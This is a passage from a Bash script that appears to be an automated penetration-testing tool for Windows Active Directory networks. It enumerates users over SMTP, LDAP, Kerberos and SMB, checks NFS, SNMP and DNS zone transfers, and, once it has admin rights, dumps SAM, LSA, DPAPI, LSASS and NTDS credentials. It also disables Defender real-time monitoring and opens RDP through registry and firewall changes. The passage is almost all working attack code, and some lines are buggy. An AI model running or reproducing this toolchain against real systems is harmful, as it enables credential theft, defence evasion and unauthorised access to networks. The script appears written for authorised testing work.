					check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
					if [[ "$check_rdp" -gt 0 ]]; then
						green_log "${SPACE}[💀] KRB OPSEC - RDP connection successed on $ip ($hostname) (via Kerberos only) -> Can be only available in restricted admin mode or with password"
					else
						#Second try with Password
						$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
						check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
						if [[ "$check_rdp" -gt 0 ]]; then
							#Can be detected by disconnection
							green_log "${SPACE}[💀] KRB NON OPSEC - RDP connection successed on $ip ($hostname) (via Kerberos only) -> Can be only available in restricted admin mode or with password"
						fi
					fi
				else
					#Can be detected by disconnection
					echo "$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot"
					$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
					check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
					if [[ "$check_rdp" -gt 0 ]]; then
						green_log "${SPACE}[💀] KRB OPSEC - RDP connection successed on $ip ($hostname) (via Kerberos only) -> Can be only available in restricted admin mode or with password"
					fi
				fi
			fi
			
			rm ~/.config/freerdp -rf
		done
	fi
}

######## SMTP #######
smtp () {
	# 25
	if [ -e "$DIR_PORTS/25.txt" ]; then
		log "[🔍] Check SMTP"
		SMTP=$(cat $DIR_PORTS/25.txt)
		for ip in $SMTP; do
			$proxychains smtp-user-enum -M VRFY -U /root/pentest_priv/Usernames.txt -t ${ip} < /dev/null >> $DIR_VULNS/smtp_${ip}.txt 2>/dev/null
			grep "exists" $DIR_VULNS/smtp_${ip}.txt | awk '{print $2}' > $DIR_VULNS/user_smtp_${ip}.txt
			green_log "${SPACE}[💀] ${cat $DIR_VULNS/user_smtp_${ip}.txt | wc -l} users found $ip via SMTP -> $DIR_VULNS/user_smtp_${ip}.txt"
			sort -u $DIR_VULNS/user_smtp_${ip}.txt -o $DIR_VULNS/user_smtp_${ip}.txt
			cat $DIR_VULNS/user_smtp_${ip}.txt >> ${DIR}/users.txt
			sort -u ${DIR}/users.txt -o ${DIR}/users.txt
		done		
	fi
}

######## NFS #######
nfs () {
	# Vérifie si le fichier 2049.txt existe
	if [ -e "$DIR_PORTS/2049.txt" ]; then
		log "[🔍] Check NFS"
		NFS=$(cat $DIR_PORTS/2049.txt)
		for ip in $NFS; do
			$proxychains showmount -e $ip > /dev/null 2>&1
			if [ $? -eq 0 ]; then
				green_log "${SPACE}[💀] NFS vulnerability detected on $ip"
				blue_log "showmount -e ${ip}"
			fi
		done
	fi
}

######## VNC #######
vnc () {
	# 5800,5801,5900,5901
	if [[ -e "$DIR_PORTS/5800.txt" ]] || [[ -e "$DIR_PORTS/5801.txt" ]] || [[ -e "$DIR_PORTS/5900.txt" ]] || [[ -e "$DIR_PORTS/5901.txt" ]]; then
		log "[🔍] Check NFS"
		for fichier in $DIR_PORTS/5800.txt $DIR_PORTS/5801.txt $DIR_PORTS/5900.txt $DIR_PORTS/5901.txt; do
			cat "$fichier" /dev/null 2>&1 >> "$DIR_PORTS/vnc.txt" || echo "Le fichier $fichier est absent."
		done
		#assemblage et suppression des doublons des clients
		sort -u ${DIR_PORTS}/vnc.txt -o ${DIR_PORTS}/vnc.txt
		
		green_log "${SPACE}[!] VNC opened on machines (check manually for credentials into default file) -> ${DIR_PORTS}/vnc.txt"
		VNC=$(cat ${DIR_PORTS}/vnc.txt)
	fi
}

###################### DNS ZONE TRANSFER  ##########################
zt () {
	log "[🔍] Trying zone transfer"
	DNSPATH=$DIR/ZoneTransfertDNS
	NS=$(host -t ns $domain | awk -F"name server" '{print$2}')
	for ip in $NS;
	do
		if ! host -t axfr $domain $(host $ip | awk -F "has address" '{print$2}') | grep -q "; Transfer failed." ;then
			green_log "${SPACE}[💀] $ip Vulnerable to zone transfer"
			if [ ! -d $DNSPATH ];then
				mkdir $DNSPATH
			fi
			host -t axfr $domain $(host $ip | awk -F "has address" '{print$2}') > $DNSPATH/$ip.txt
			green_log "${SPACE}[💀] Zone transfer performed successfully !"
			blue_log "${SPACE} [+] Details to be retreived at $DNSPATH"
		fi
	done
}

# ########################### Printer Recon ###############################
printers () {
	log "[🔍] Printer Scan using SNMP Protocol Started"
	#pret is a python script that discover printers via snmp broadcast
	if [ "$rangeIP" == "$NETWORK_LAN" ];then
		python2 pret.py >> $DIR/PrinterScan.txt 2>>/dev/null
		if grep -qi "Device" $DIR/PrinterScan.txt ;then
			green_log "${SPACE}[!] Printers found ! Please combine these findings with the nmap web interface scan for printers -> $DIR/PrinterScan.txt"
		else
			#red_log "${SPACE}[!] No printers using SNMP were found !"
			rm .Printer_enum.txt
		fi
	else
		log "${SPACE}[!] You can try to execute this search with -> python2 pret.py $domain"
	fi
}

# ########################### SNMP ###############################
snmp () {
	if [[ -e "$DIR_PORTS/161.txt" ]] || [[ -e "$DIR_PORTS/162.txt" ]] || [[ -e "$DIR_PORTS/1061.txt" ]] || [[ -e "$DIR_PORTS/1062.txt" ]]; then
		log "[🔍] Check devices using SNMP protocol on public community"
		#merge of files
		for fichier in $DIR_PORTS/161.txt $DIR_PORTS/162.txt $DIR_PORTS/1061.txt $DIR_PORTS/1062.txt; do
			cat "$fichier" /dev/null 2>&1 >> "$DIR_PORTS/snmp.txt" || echo "Le fichier $fichier est absent."
		done
		#Remove duplicates ip
		sort -u ${DIR_PORTS}/snmp.txt -o ${DIR_PORTS}/snmp.txt
		for ip in ${DIR_PORTS}/snmp.txt; do
			hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
			# Affichage des DC
			result_v1=""
			result_v1=$(snmpwalk -v 1 -c public $ip)
			result_v2c=""
			result_v2c=$(snmpwalk -v 2c -c public $ip -t $SNMP_TIMEOUT)
			if [[ -n "$result_v1" ]]; then
				green_log "${SPACE}[💀] SNMP v1 in PUBLIC community found on $ip ($hostname) : ${DIR_VULNS}/SNMP-Public_v1.txt"
				echo "$result_v1" >> ${DIR_VULNS}/SNMP-Public_v1.txt
			fi
			if [[ -n "$result_v2c" ]]; then
				green_log "${SPACE}[💀] SNMP v2c in PUBLIC community found on $ip ($hostname) : ${DIR_VULNS}/SNMP-Public_v2c.txt"
				echo "$result_v2c" >> ${DIR_VULNS}/SNMP-Public_v2c.txt
			fi
		done
	fi
}

# ########################### LDAP ###############################
ldap () {
	### ANONYMOUS LDAP ###
	if [[ -e "${DIR_PORTS}/389.txt" ]]; then
		mkdir ${DIR_VULNS}/ldap
		log "[🔍] Anonymous LDAP check"
		#Extract the IPs of machines with port 389 open
		ip=$(cat "${DIR_PORTS}/389.txt")
		#extraction of the FQDN and IP names of machines with port 389 open
		grep -E $ip ${DIR}/hostname_file.txt > ${DIR}/IP_FQDN_ldap.txt
		#Extraction of one line (ip + hostname) from the LDAP server (AD) for each domain/sub-domain. The aim is not to carry out the attack on 3 DCs in the same domain
		awk -F ':' '{ split($2, parts, "."); domain = parts[2] "." parts[3] "." parts[4] "." parts[5]  "." parts[6]; if (!seen[domain]++) print $0;}' ${DIR}/IP_FQDN_ldap.txt > ${DIR}/IP_FQDN_ldap_filtered.txt
		LDAP_ip=$(cat ${DIR}/IP_FQDN_ldap_filtered.txt | cut -d':' -f1)
		LDAP_domain_old=()
		for ip in $LDAP_ip; do
			#Récupération du nom de domaine associé à l'IP
			LDAP_domain=$(grep -E ${ip} ${DIR}/IP_FQDN_ldap_filtered.txt | cut -d':' -f2- |cut -d'.' -f2-)
			
			#If domain didn't pass yet
			if [[ ! " ${LDAP_domain_old[@]} " =~ " ${LDAP_domain} " ]]; then
				log "${SPACE}[📂] Check for domain ${LDAP_domain} ($ip) ..."
				#Création de la base pour la requete ldapsearch
				base_ldap="DC=$(echo "$LDAP_domain" | sed 's/\./,DC=/g')"
				DC_Name=$(grep -E ${ip} ${DIR}/IP_FQDN_ldap_filtered.txt | cut -d':' -f2-)
				#Adding $LDAP_domain in the LDAP_domain_old LDAP_domain_old
				LDAP_domain_old+=("$LDAP_domain")
				
				#Extraction des utilisateurs et groupes (CN) : Peu précis ..
				echo "$proxychains ldapsearch -H ldap://${ip} -x -w '' -D '' -b $base_ldap"
				$proxychains ldapsearch -H ldap://${ip} -x -w '' -D '' -b "${base_ldap}" | grep 'dn: CN=' > ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt 2>/dev/null
				check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt | wc -l)
				
				if [[ "$check_ldap" -gt 0 ]]; then
					green_log "${SPACE}[💀] Anonymous LDAP possible -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}.txt"
					
					#Aller plus loin en tentant d'extraire les noms d'utilisateurs :
					$proxychains ldapsearch -H ldap://${ip} -x -w '' -D '' -b "${base_ldap}" "objectclass=user" sAMAccountName | grep "sAMAccountName" | awk -F ": " '{print $2}'| grep -v "sAMAccountName" > ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt 2>/dev/null
					check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt | wc -l)

					if [[ "$check_ldap" -gt 0 ]]; then
						green_log "${SPACE}[💀] Users extracted -> ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt"
					fi
					
					#Retrieving the users account via kerbrute and trying to get no-preauth users
					$proxychains kerbrute userenum --dc $DC_Name -d $LDAP_domain ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt -t 50 --downgrade --hash-file ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt > ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt 2>/dev/null
					check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt | grep 'krb5asrep' | wc -l)
					if [[ "$check_ldap" -gt 0 ]]; then
						green_log "${SPACE}[💀] Users without pre-auth found ! -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt"
					fi
					cat ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt | grep 'VALID' | awk -F "[:@]" '{print $4}'| sed 's/^[ \t]*//;s/[ \t]*$//' >> ${DIR}/users.txt
					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
				fi
			fi
		done
		
		rm ${DIR}/IP_FQDN_ldap.txt
		rm ${DIR}/IP_FQDN_ldap_filtered.txt
	fi

	### ENUMERATION LDAP ###
	LDAP_Servers=$(cat $DIR/ports/88.txt $DIR/ports/389.txt | sort | uniq)
	ldap_modules=(adcs laps get-userPassword get-unixUserPassword)
	if [[ -n "$LDAP_Servers" ]] && [[ "$Username" != "anonymous" ]]; then
		log "[🔍] Enumeration via LDAP"
		for module in ${ldap_modules[@]};do
			echo $LDAP_Servers | while read ip;do
				host=${ip}
				$proxychains timeout $CME_TIMEOUT netexec ldap $host -u $Username $cme_creds -M $module < /dev/null > $DIR_VULNS/Enum_Device_${ip}_$module.txt 2>/dev/null
				if grep -Eqo "STATUS_NOT_SUPPORTED|Failed to authenticate the user .* with ntlm" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then 
					#If NTLM isn't supported, then use kerberos authentification
					hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
					if [[ -n "$hostname" ]];then
						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
						host="$(echo $hostname | cut -d '.' -f 1)"
					else
						host="$ip"
					fi
					if [[ -n "$hostname" ]];then
						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
						host="$(echo $hostname | cut -d '.' -f 1)"
					fi
					$proxychains timeout $CME_TIMEOUT netexec smb $host -u $Username $cme_creds $kerberos -M $module < /dev/null > $DIR_VULNS/Enum_Device_${ip}_$module.txt 2>/dev/null
				fi
				if [[ "$module" == "laps" ]] && grep -Eqio "Password:" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
					green_log "${SPACE}[💀] '$module' password(s) found from ${username} account ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
				elif [[ "$module" == "adcs" ]] && grep -Eqio "FOUND PKI|Found CN" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
					green_log "${SPACE}[💀] '$module' server found ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
				elif [[ "$module" == "get-userPassword" ]] && grep -Eqio "GET-USER" $DIR_VULNS/Enum_Device_${ip}_$module.txt && ! grep -Eqio "No userPassword Found" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
					green_log "${SPACE}[💀] Users Password found ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
				elif [[ "$module" == "get-unixUserPassword" ]] && grep -Eqio "GET-UNIX" $DIR_VULNS/Enum_Device_${ip}_$module.txt && ! grep -Eqio "No unixUserPassword Found" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
					green_log "${SPACE}[💀] Unix Users Password found ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
				fi
			done 
		done
	fi
}

ipmi () {
	if [[ -e "${DIR_PORTS}/623.txt" ]]; then
		log "[🔍] Some IPMI ports detected ! -> ${DIR_PORTS}/623.txt"
	fi
}

mssql () {
	if [[ -e "${DIR_PORTS}/1443.txt" ]] && [[ "$Username" != "anonymous" ]]; then
	mkdir ${DIR_VULNS}/mssql
		log "[🔍] MSSQL check"
		MSSQL=$(cat ${DIR_PORTS}/1443.txt)
		for ip in $MSSQL; do
			cat ${DIR_VULNS}/mssql/cme_${ip}_basic
			$proxychains netexec --timeout $CME_TIMEOUT mssql $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
			if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/mssql/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/mssql/cme_${ip}_basic"; then
				#If NTLM is not supported, restart with kerberos
				hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
				if [[ -n "$hostname" ]];then
					kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
					host="$(echo $hostname | cut -d '.' -f 1)"
				fi
				$proxychains netexec mssql $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
			fi
			if grep -aq '\[+\]' ${DIR_VULNS}/mssql/cme_${ip}_basic; then
				green_log "${SPACE}[💀] $Username is a valid username ${ip} (${hostname})"
			fi
			if grep -aq '(Pwn3d!)' ${DIR_VULNS}/mssql/cme_${ip}_basic; then
				red_log "${SPACE}[💀] $Username have admin rights on MSSQL DB ${ip} (${hostname}) !"
			fi
		done
	fi
}

########################### SCAN SMB ###############################
smb () {
	if [[ -e "${DIR_PORTS}/445.txt" ]]; then
		mkdir ${DIR_VULNS}/smb
		log "[🔍] SMB check"
		SMB=$(cat ${DIR_PORTS}/445.txt)
		for ip in $SMB;	do
			hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
			log "${SPACE}[📂] Check for $ip ($hostname) ..."

			#Anonymous / null session is allowed ?
			$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session 2>/dev/null
			if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
				green_log "${SPACE}[💀] $ip allow null session (anonymous)"
				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute 2>/dev/null
				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -i 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
				## Injecter ces utilisateurs dans un fichier
				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' >> ${DIR}/users_with_descriptions.txt
				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
				## Supprimer les doublons
				sort -u ${DIR}/users.txt -o ${DIR}/users.txt
				sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute | grep -av '\[.\]' | awk -F'\\' '{print $2}' | wc -l)
				if [[ "$check_smb" -gt 0 ]]; then
					green_log "${SPACE}[💀] New users found (check descriptions can be interesting) -> ${DIR}/users_with_descriptions.txt"
				fi
			fi
			# Guest session allowed ?
			$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest 2>/dev/null
			if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest; then
				green_log "${SPACE}[💀] $ip allow guest session, trying to extract users .."
				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute 2>/dev/null
				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -i 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users 2>/dev/null
				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' >> ${DIR}/users_with_descriptions.txt
				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
				## Supprimer les doublons
				sort -u ${DIR}/users.txt -o ${DIR}/users.txt
				sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_guest_users ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute | grep -av '\[.\]' | awk -F'\\' '{print $2}' | wc -l)
				if [[ "$check_smb" -gt 0 ]]; then
					green_log "${SPACE}[💀] New users found (check descriptions can be interesting) -> ${DIR}/users_with_descriptions.txt"
				fi
			fi
			# Can i connect with input user ?
			if [[ "$Username" != "anonymous" ]]; then
				cat ${DIR_VULNS}/smb/cme_${ip}_basic
				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic 2>/dev/null
				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/smb/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/smb/cme_${ip}_basic"; then
					#If NTLM is not supported, restart with kerberos
					if [[ -n "$hostname" ]];then
						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
						host="$(echo $hostname | cut -d '.' -f 1)"
					fi
					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic 2>/dev/null
				else
					kerberos=""
					host="${ip}"
				fi
			fi
			#Can we connect to at least one share ?
			if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_basic || grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest || grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
				if [[ "$Username" != "anonymous" ]]; then
					green_log "${SPACE}[💀] $Username is a valid username"
				fi
				can_connect="1"
			else
				can_connect="0"
			fi
			#Are we machine's admin
			if grep -aq '(Pwn3d!)' ${DIR_VULNS}/smb/cme_${ip}_basic; then
				red_log "${SPACE}[💀] $Username is admin of this machine ! -> impacket-smbexec to exploit"
				admin="1"
			else
				admin="0"
			fi
			
			if [ "$can_connect" = "1" ]; then
				#List available shares
				if [ "$Username" = "anonymous" ]; then
					$proxychains smbmap --timeout 20 -H $host > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
					green_log "${SPACE}[💀] Shares available are logged there -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
					blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '' -p '' --exclude IPC$"
				else
					$proxychains smbmap --timeout 20 -H $host -u "$Username" $cme_creds $kerberos > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
					green_log "${SPACE}[💀] Shares available are logged there -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
					if [ -n "$NT_Hash" ]; then
						blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '${Username}' -p 'aad3b435b51404eeaad3b435b51404ee:${NT_Hash}' --exclude IPC$"
					else
						blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '${Username}' -p '${Password}' --exclude IPC$"
					fi
				fi
				
				
				###### RETRIEVE POLICY PASSWORD ######
				$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --pass-pol < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_pass_pol 2>/dev/null
				check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_pass_pol | wc -l)
				if [ "$check_smb" -gt 1 ]; then
					green_log "${SPACE}[💀] Password Policy found -> ${DIR_VULNS}/smb/cme_${ip}_pass_pol"
				fi
				
				###### RETRIEVE USERS ######
					#'< /dev/null' avoid netexec to break the loop, weird behavior ..
				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_rid_brute 2>/dev/null
				cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute |grep -i 'SidTypeUser' |grep -i 'SidTypeUser'| grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute | wc -l)
				if [[ "$check_smb" -gt 4 ]]; then
					green_log "${SPACE}[💀] New users found (via RID_brute) -> ${DIR_VULNS}/smb/cme_${ip}_rid_brute"

					## Injecter ces utilisateurs dans un fichier
					cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
					## Supprimer les doublons
					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
				fi
				
				$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_users 2>/dev/null
				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_users | wc -l)
				if [[ "$check_smb" -gt 4 ]]; then
					green_log "${SPACE}[💀] New users found (check descriptions can be interesting) -> ${DIR}/users_with_descriptions.txt"
								
					## Injecter ces utilisateurs dans un fichier
					cat ${DIR_VULNS}/smb/cme_${ip}_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' >> ${DIR}/users_with_descriptions.txt
					cat ${DIR_VULNS}/smb/cme_${ip}_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
					## Supprimer les doublons
					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
					sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
				fi
				
				if [ "$admin" = "1" ]; then
					###### DUMP SAM ######
					$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos --sam < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_sam 2>/dev/null
					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_sam | wc -l)
					
					if [ "$check_smb" -gt 1 ]; then
						green_log "${SPACE}[💀] Success dump SAM -> ${DIR_VULNS}/smb/cme_${ip}_sam"
					fi
					
					###### DUMP LSA ######
					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --lsa < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_lsa 2>/dev/null
					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsa | wc -l)
					
					if [ "$check_smb" -gt 1 ]; then
						green_log "${SPACE}[💀] Success dump LSA -> ${DIR_VULNS}/smb/cme_${ip}_lsa"
					fi
					
					###### DUMP DPAPI ######
					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --lsa < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_dpapi 2>/dev/null
					check_smb=$(grep -oa 'Looting secrets' ${DIR_VULNS}/smb/cme_${ip}_dpapi | wc -l)
					
					if [ "$check_smb" -gt 0 ]; then
						green_log "${SPACE}[💀] Success dump DPAPI -> ${DIR_VULNS}/smb/cme_${ip}_dpapi"
					fi
					
					##### IMPERSONATE #####
					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M impersonate < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_impersonate 2>/dev/null
					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_impersonate | wc -l)
					
					if [ "$check_smb" -gt 1 ]; then
						green_log "${SPACE}[💀] Success impersonnate -> ${DIR_VULNS}/smb/cme_${ip}_impersonate"
						blue_log "${SPACE} [+] Possibility to exploit via : $proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M impersonate -o TOKEN=1 EXEC='whoami'"
					fi
					
					
					###### COMMAND EXECUTION ######
					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x "whoami" < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd 2>/dev/null
					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_cmd | wc -l)
					
					if [ "$check_smb" -gt 1 ]; then
						green_log "${SPACE}[💀] Success command execution"
						
						#Disabling RealTimeMonitoring
						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'powershell Set-MpPreference -DisableRealTimeMonitoring $true' < /dev/null
						
						#### Extract LSSAS only on VM that are not DC - to avoid possible crash ..
						if [ $(cat $DIR_PORTS/88.txt | grep -aqi "$ip"; echo $?) -eq 1 ]; then
							###### DUMP LSASS ######
							$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M lsassy < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_lsass 2>/dev/null
							check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsass | wc -l)
							
							if [ "$check_smb" -gt 0 ]; then
								green_log "${SPACE}[💀] Success dump LSASS.EXE -> ${DIR_VULNS}/smb/cme_${ip}_lsass"
							fi
						else
							##### NTDS extract #####
							$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --ntds < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_ntds 2>/dev/null
							check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_ntds | wc -l)
							
							if [ "$check_smb" -gt 1 ]; then
								green_log "${SPACE}[💀] Success dump NTDS -> ${DIR_VULNS}/smb/cme_${ip}_ntds"
							fi
						fi
						
						#Check for disconnected RDP sessions
						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'query user' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp 2>/dev/null
						check_smb=$(grep -aEi 'Déco|Deco|Dis' ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp | wc -l)
						if [ "$check_smb" -gt 0 ]; then
							green_log "${SPACE}[💀] Found RDP session disconnected -> ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp"
						fi
						#If RDP is not enabled
						if ! grep -q "$ip" $DIR_PORTS/3389.txt;then 
							#Enable RDP in registry
							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
							echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'"
							echo "${DIR_VULNS}/smb/cme_${ip}_enabling_rdp"
							#Allow RDP connexion on the machine
							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
							actual_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes'"
							future_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=No'"
